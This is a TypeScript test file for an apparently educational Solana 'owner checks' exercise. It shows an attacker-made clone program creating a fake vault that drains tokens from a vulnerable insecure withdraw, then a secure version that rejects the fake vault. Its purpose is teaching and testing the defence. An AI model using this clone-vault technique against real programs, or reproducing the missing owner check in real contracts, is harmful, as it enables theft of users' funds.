import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { web3 } from "@coral-xyz/anchor";
import * as spl from "@solana/spl-token";

import { SolanaOwnerChecksStarter } from "../target/types/solana_owner_checks_starter";
import { expect } from "chai";
import { AttackClone } from "../target/types/attack_clone";

describe("solana-owner-checks-starter", () => {
    // Configure the client to use the local cluster.
    const provider = anchor.AnchorProvider.env();
    anchor.setProvider(provider);

    const program = anchor.workspace
        .SolanaOwnerChecksStarter as Program<SolanaOwnerChecksStarter>;
    const programAttackClone = anchor.workspace
        .AttackClone as Program<AttackClone>;

    const vault = anchor.web3.Keypair.generate();
    const vaultClone = anchor.web3.Keypair.generate();
    const connection = anchor.getProvider().connection;
    const wallet = anchor.workspace.OwnerCheck.provider.wallet;
    const walletFake = anchor.web3.Keypair.generate();

    const [tokenPDA] = web3.PublicKey.findProgramAddressSync(
        [Buffer.from("token")],
        program.programId
    );

    let mint: anchor.web3.PublicKey;
    let withdrawDestination: anchor.web3.PublicKey;
    let withdrawDestinationFake: anchor.web3.PublicKey;

    before(async () => {
        mint = await spl.createMint(
            connection,
            wallet.payer,
            wallet.publicKey,
            null,
            0
        );

        withdrawDestination = await spl.createAccount(
            connection,
            wallet.payer,
            mint,
            wallet.publicKey
        );

        withdrawDestinationFake = await spl.createAccount(
            connection,
            wallet.payer,
            mint,
            walletFake.publicKey
        );

        await connection.confirmTransaction(
            await connection.requestAirdrop(
                walletFake.publicKey,
                1 * anchor.web3.LAMPORTS_PER_SOL
            ),
            "confirmed"
        );
    });

    it("Initialize Vault", async () => {
        await program.methods
            .initializeVault()
            .accounts({
                vault: vault.publicKey,
                // tokenAccount: tokenPDA,
                mint: mint,
                authority: provider.wallet.publicKey,
            })
            .signers([vault])
            .rpc();

        await spl.mintTo(
            connection,
            wallet.payer,
            mint,
            tokenPDA,
            wallet.payer,
            100
        );

        const balance = await connection.getTokenAccountBalance(tokenPDA);
        expect(balance.value.uiAmount).to.eq(100);
    });

    it("Initialize Fake Vault", async () => {
        const tx = await programAttackClone.methods
            .initializeVault()
            .accounts({
                vault: vaultClone.publicKey,
                tokenAccount: tokenPDA,
                authority: walletFake.publicKey,
            })
            .transaction();

        await anchor.web3.sendAndConfirmTransaction(connection, tx, [
            walletFake,
            vaultClone,
        ]);
    });

    it("Insecure Withdraw Attack", async () => {
        let tx = await program.methods
            .insecureWithdraw()
            .accounts({
                vault: vaultClone.publicKey, // 攻击者的vault账户
                withdrawDestination: withdrawDestinationFake,
                authority: walletFake.publicKey,
                // tokenAccount: tokenPDA,
            })
            .transaction();

        await web3.sendAndConfirmTransaction(connection, tx, [walletFake]);

        const balance = await connection.getTokenAccountBalance(tokenPDA);
        expect(balance.value.uiAmount).to.eq(0);

        const hack_balance = await connection.getTokenAccountBalance(
            withdrawDestinationFake
        );
        expect(hack_balance.value.uiAmount).to.eq(100);
    });

    it("secure withdraw expect ok", async () => {
        await spl.mintTo(
            connection,
            wallet.payer,
            mint,
            tokenPDA,
            wallet.payer,
            100
        );
        await program.methods
            .secureWithdraw()
            .accounts({
                vault: vault.publicKey,
                withdrawDestination: withdrawDestination,
                // authority: wallet.publicKey,
            })
            .rpc();

        const balance = await connection.getTokenAccountBalance(tokenPDA);
        expect(balance.value.uiAmount).to.eq(0);
    });

    it("secure withdraw expect fail", async () => {
        await spl.mintTo(
            connection,
            wallet.payer,
            mint,
            tokenPDA,
            wallet.payer,
            100
        );

        try {
            let tx = await program.methods
                .secureWithdraw()
                .accounts({
                    vault: vaultClone.publicKey,
                    withdrawDestination: withdrawDestinationFake,
                    authority: walletFake.publicKey,
                })
                .transaction();

            let txid = await web3.sendAndConfirmTransaction(connection, tx, [
                walletFake,
            ]);
        } catch (error: any) {
            expect(error.message)
                .to.toString()
                .includes(
                    "The given account is owned by a different program than expected"
                );
            console.error(error.message);
        }
    });
});
